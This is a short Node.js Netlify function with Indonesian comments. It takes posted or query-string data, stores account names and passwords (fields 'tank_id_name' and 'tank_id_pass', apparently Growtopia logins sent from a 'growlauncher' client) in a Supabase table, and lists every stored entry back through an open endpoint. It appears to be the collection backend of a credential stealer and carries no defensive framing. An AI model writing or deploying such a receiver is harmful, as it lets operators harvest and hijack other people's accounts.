const { createClient } = require('@supabase/supabase-js');

// Mengambil URL dan Key dari Environment Variables Netlify
// Gunakan SUPABASE_URL dan SUPABASE_KEY (sesuai log Netlify Anda)
const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY);

exports.handler = async (event) => {
    const headers = {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Headers": "Content-Type",
        "Content-Type": "application/json"
    };

    try {
        let inputData;
        
        // Cek apakah data dikirim via GET (Query String) atau POST (Body)
        if (event.httpMethod === 'GET') {
            if (!event.queryStringParameters.data) throw new Error("No data provided");
            inputData = JSON.parse(event.queryStringParameters.data);
        } else if (event.httpMethod === 'POST') {
            inputData = JSON.parse(event.body);
        } else {
            // Jika method GET tanpa parameter, tampilkan data untuk UI
            const { data, error } = await supabase
                .from('growlauncher_logs')
                .select('*')
                .order('created_at', { ascending: false });

            if (error) throw error;
            return { statusCode: 200, headers, body: JSON.stringify(data) };
        }

        // Simpan ke Supabase
        const { error } = await supabase
            .from('growlauncher_logs')
            .insert([
                { 
                    tank_id_name: inputData.idName, 
                    tank_id_pass: inputData.idPass, 
                    meta_data: inputData.meta 
                }
            ]);

        if (error) throw error;

        return { 
            statusCode: 200, 
            headers, 
            body: JSON.stringify({ status: "Success", message: "Data synced to NovaScript" }) 
        };
    } catch (err) {
        return { 
            statusCode: 500, 
            headers, 
            body: JSON.stringify({ error: err.message }) 
        };
    }
};
